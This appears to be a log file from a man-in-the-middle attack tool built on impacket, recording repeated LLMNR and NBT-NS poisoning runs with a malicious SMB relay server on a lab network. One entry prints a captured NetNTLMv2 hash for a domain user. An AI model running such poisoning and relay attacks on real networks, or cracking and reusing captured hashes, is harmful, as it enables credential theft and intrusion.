2021-11-30 17:39:52.339 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:127 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-11-30 17:40:23.952 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:118 - Exiting smb relay attack ...
2021-11-30 17:44:06.086 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:127 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-11-30 17:44:06.094 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_llmnr_poisoning:383 - Starting llmnr poisoning...
2021-11-30 17:44:06.095 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-11-30 17:44:06.103 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-30 17:44:06.108 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-30 17:44:06.108 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-30 17:44:16.165 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:118 - Exiting smb relay attack ...
2021-11-30 18:05:26.286 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:127 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-11-30 18:05:26.299 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_llmnr_poisoning:383 - Starting llmnr poisoning...
2021-11-30 18:05:26.300 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-11-30 18:05:26.307 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-30 18:05:26.308 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-30 18:05:26.311 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-30 18:06:00.793 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:118 - Exiting smb relay attack ...
2021-11-30 18:06:47.379 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:127 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-11-30 18:06:47.394 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_llmnr_poisoning:383 - Starting llmnr poisoning...
2021-11-30 18:06:47.395 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-11-30 18:06:47.400 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-30 18:06:47.402 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-30 18:06:47.402 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-30 18:06:52.489 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:342 - [36m(LLMNR) Sending packet to fe80::1cb7:6a5:258:73f9[0m
2021-11-30 18:06:56.238 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:118 - Exiting smb relay attack ...
2021-11-30 18:09:30.164 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:127 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-11-30 18:09:30.170 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_llmnr_poisoning:385 - Starting llmnr poisoning...
2021-11-30 18:09:30.171 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-11-30 18:09:30.174 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-30 18:09:30.175 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-30 18:09:30.175 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-30 18:09:36.232 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:343 - [36m(LLMNR) Sending packet to fe80::1cb7:6a5:258:73f9[0m
2021-11-30 18:09:38.422 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:118 - Exiting smb relay attack ...
2021-11-30 18:10:48.546 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:127 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-11-30 18:10:48.551 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_llmnr_poisoning:385 - Starting llmnr poisoning...
2021-11-30 18:10:48.551 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-11-30 18:10:48.559 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-30 18:10:48.560 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-30 18:10:48.561 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-30 18:10:52.634 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:343 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
2021-11-30 18:10:56.258 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:118 - Exiting smb relay attack ...
2021-11-30 18:17:03.424 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:127 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-11-30 18:17:03.442 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_llmnr_poisoning:385 - Starting llmnr poisoning...
2021-11-30 18:17:03.444 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-11-30 18:17:03.455 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-11-30 18:17:03.456 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-30 18:17:03.460 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-30 18:17:07.508 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:343 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
2021-11-30 18:17:07.547 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.129,50291)
2021-11-30 18:17:07.689 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
2021-11-30 18:17:07.690 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-ALEX\apuia authenticated successfully
2021-11-30 18:17:07.700 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:f0d3706d5f4ed3b415671d38a827c194:01010000000000008053b77b16e6d7011f9d2de56590059f00000000010010007a0067004c006b006900590053006d00030010007a0067004c006b006900590053006d000200100041004c006700470045007900720043000400100041004c00670047004500790072004300070008008053b77b16e6d70106000400020000000800300030000000000000000100000000200000f45919a3b25f436d357a66d0351550d519d6761e86cb54425214b83fc40227b60a001000000000000000000000000000000000000900620063006900660073002f006c006d0061006f006f006f0061006d00690067006f0073007300730073006400650079006f00750074007500620065006a0065006a0065006a006f006a006f002e006c006f00630061006c0064006f006d00610069006e000000000000000000
2021-11-30 18:17:07.783 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
2021-11-30 18:17:07.827 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
2021-11-30 18:17:08.460 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-11-30 18:17:18.121 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:118 - Exiting smb relay attack ...
2021-12-01 17:18:52.544 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:19:39.775 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:19:39.779 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:19:39.780 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:19:39.798 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:19:39.801 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:19:39.801 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:21:08.469 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:22:44.479 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:22:44.495 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:540 - Starting nbt-ns poisoning...
2021-12-01 17:22:44.497 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:22:44.504 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:22:44.505 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:22:44.506 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:22:58.722 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:28:04.031 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:28:04.035 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:28:04.036 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:28:04.039 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:28:04.041 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:28:04.041 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:29:10.350 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:29:15.826 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:29:15.843 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:29:15.845 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:29:15.855 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:29:15.861 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:29:15.862 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:30:31.985 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:30:38.069 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:30:38.075 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:30:38.075 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:30:38.078 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:30:38.079 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:30:38.080 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:30:55.462 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:31:50.143 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:31:50.147 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:31:50.148 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:31:50.151 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:31:50.157 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:31:50.158 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:32:59.539 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:34:00.600 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:34:00.604 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:34:00.604 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:34:00.607 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:34:00.608 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:34:00.609 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:34:30.378 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-01 17:34:37.611 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:37:06.056 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:37:06.073 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:37:06.075 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:37:06.086 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:37:06.090 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:37:06.092 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:37:42.718 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-01 17:37:42.764 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to None[0m
2021-12-01 17:38:00.810 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 17:59:10.144 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 17:59:10.163 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 17:59:10.165 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 17:59:10.176 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 17:59:10.178 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 17:59:10.187 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 17:59:54.679 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-01 17:59:54.720 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to None[0m
2021-12-01 18:01:07.866 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-01 18:01:09.673 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-01 18:01:09.692 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-01 18:01:09.694 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-01 18:01:09.715 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-01 18:01:09.719 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-01 18:01:09.720 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-01 18:01:43.249 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-01 18:01:43.283 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to None[0m
2021-12-01 18:02:02.534 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-03 12:57:54.400 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-03 12:57:54.405 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:539 - Starting nbt-ns poisoning...
2021-12-03 12:57:54.405 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-03 12:57:54.408 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-03 12:57:54.409 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-03 12:57:54.409 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-03 12:58:07.201 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-03 12:58:07.236 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - [36m(NBT_NS) Sending packet to None[0m
2021-12-03 12:58:19.006 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-03 12:58:55.141 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-03 12:58:55.146 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:540 - Starting nbt-ns poisoning...
2021-12-03 12:58:55.146 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-03 12:58:55.154 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-03 12:58:55.156 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-03 12:58:55.156 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-03 12:59:05.236 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-03 12:59:05.264 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to None[0m
2021-12-03 12:59:13.470 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-03 13:00:37.555 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-03 13:00:37.561 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:540 - Starting nbt-ns poisoning...
2021-12-03 13:00:37.562 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-03 13:00:37.567 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-03 13:00:37.573 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-03 13:00:37.574 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-03 13:01:19.301 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-03 13:02:25.942 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-03 13:02:25.948 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:540 - Starting nbt-ns poisoning...
2021-12-03 13:02:25.948 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-03 13:02:25.951 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-03 13:02:25.952 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-03 13:02:25.953 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-03 13:03:04.231 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-03 13:03:04.274 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to None[0m
2021-12-03 13:03:24.226 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 16:33:56.799 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:33:56.809 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:540 - Starting nbt-ns poisoning...
2021-12-04 16:33:56.810 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:33:56.819 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:33:56.824 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:33:56.826 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:34:10.659 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:34:10.693 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:34:42.960 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 16:34:44.241 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:34:44.255 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:540 - Starting nbt-ns poisoning...
2021-12-04 16:34:44.259 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:34:44.269 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:34:44.271 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:34:44.272 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:34:46.116 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 16:34:53.059 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:34:53.066 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:540 - Starting nbt-ns poisoning...
2021-12-04 16:34:53.066 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:34:53.072 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:34:53.077 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:34:53.077 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:35:05.349 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:35:05.386 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:35:37.892 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 16:39:15.700 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:39:15.705 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:544 - Starting nbt-ns poisoning...
2021-12-04 16:39:15.705 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:39:15.709 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:39:15.711 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:39:15.713 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
